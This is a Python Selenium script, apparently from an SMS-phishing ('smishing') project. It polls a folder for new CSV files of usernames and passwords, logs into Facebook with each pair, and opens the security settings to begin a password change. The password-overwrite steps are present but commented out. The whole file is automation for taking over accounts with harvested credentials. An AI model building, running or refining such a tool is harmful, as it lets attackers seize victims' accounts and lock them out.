import os
import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# Set the path to the directory where new .csv files will be created
watch_directory = '/Users/karypaquot/Documents/GitHub/Smishing-Project/scripts'

# Set the URL of the login page
login_url = 'https://www.facebook.com'

# Set the path to your web driver
driver_path = '/usr/local/bin/chromedriver'

# Create a function that logs in using the given username and password
def login(username, password):
    # Create a new instance of the Chrome browser
    driver = webdriver.Chrome(driver_path)

    # Navigate to the login page
    driver.get(login_url)

    # Enter the username and password
    input_email = driver.find_element_by_name('email')
    input_pass = driver.find_element_by_name('pass')

    input_email.clear()
    input_email.send_keys(username)
    input_pass.clear()
    input_pass.send_keys(password)

    # Submit the login form
    input_pass.submit()

    # Wait for the page to load
    time.sleep(5)
    # Set the url to the settings page
    settings_url = 'https://www.facebook.com/settings/?tab=account'
    # navigate to the settings page
    driver.get(settings_url)
    # Wait for the page to load
    time.sleep(5)
    #set the url to the security page 
    security_url = 'https://www.facebook.com/settings?tab=security'
    #navigate to the security page 
    driver.get(security_url)
    # Wait for the page to load
    time.sleep(5)

    #iframe = driver.find_elements_by_tag_name('iframe')[0]
    #driver.switch_to.frame(iframe)

    # switch to parent frame
    driver.switch_to.default_content()

    # switch to iframe
    iframe = driver.find_element_by_css_selector("iframe.x76ihet[src='https://www.facebook.com/settings?tab=security']")
    driver.switch_to.frame(iframe)

    # click on the button
    edit_button = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, "//button[text()='Edit']")))
    edit_button.click()
    # Enter the old password and new password 
    #input_password_old = driver.find_element_by_id('password_old')
    #input_password_old.clear()
    #input_password_old.send_keys(password)

    #input_new_password = driver.find_element_by_id('password_new')
    #input_new_password.clear()
    #input_new_password.send_keys(password)

    #input_retype_new_password = driver.find_element_by_id('password_confirm')
    #input_retype_new_password.clear()
    #input_retype_new_password.send_keys(password)

    #save_changes = driver.find_element_by_id('u_b_0_WN')
    #save_changes.click()

    #button for the edit class="_1nf- _4jy0 _4jy3 _517h _51sy _42ft"

    # Close the browser
    #driver.quit()

# Set the initial list of files in the directory
before = dict ([(f, None) for f in os.listdir(watch_directory)])

while True:
    # Get the list of files in the directory
    after = dict ([(f, None) for f in os.listdir(watch_directory)])

    # Get the list of new files
    new_files = [f for f in after if not f in before]

    # Process new files
    for filename in new_files:
        # Check if the file is a .csv file
        if filename.endswith('.csv'):
            # Open the file and read the first line
            with open(os.path.join(watch_directory, filename), 'r') as f:
                lines = f.readlines()
                line = lines[1].strip()

            # Split the line into two strings
            username, password = line.split(',')

            # Log in using the username and password
            login(username, password)

    # Update the list of files in the directory
    before = after

    # Wait for 10 seconds before checking for new files again
    time.sleep(10)

